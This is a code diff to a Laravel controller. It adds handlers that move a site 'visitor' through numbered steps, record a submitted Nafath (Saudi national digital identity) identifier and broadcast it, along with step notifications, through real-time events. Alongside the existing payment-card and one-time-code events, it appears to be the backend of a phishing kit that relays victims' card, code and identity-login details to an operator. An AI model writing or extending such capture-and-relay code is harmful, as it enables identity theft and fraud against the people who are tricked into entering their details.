@@ -14,6 +14,7 @@ use App\Models\PaymentCard;
 use Illuminate\Http\Request;
 use App\Events\SendCodeEvent;
 use App\Events\RecieveCodeEvent;
+use App\Events\SendNafadId;
 use App\Events\SendNotification;
 use App\Models\VisitorNotifications;
 use Illuminate\Validation\ValidationException;
@@ -315,5 +316,41 @@ class TripController extends Controller
         $visitor_id = $request->visitor_id;
         $code = $request->code;
         event(new RecieveCodeEvent($visitor_id,$code));
+    }
+    public function saveRecievedCode(Request $request)
+    {
+        try {
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+
+                $not  = VisitorNotifications::first();
+                $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
+                session()->put('visitor', json_encode($not));
+                // event(new SendCode($not));
+                event(new SendNotification($not));
+            }
+            return view('nafad');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
+    }
+    public function saveNafadId(Request $request)
+    {
+        try {
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+
+                $not  = VisitorNotifications::first();
+                $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null]);
+                session()->put('visitor', json_encode($not));
+                event(new SendNafadId($not));
+                event(new SendNotification($not));
+            }
+            return view('final_step');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
     }
 }
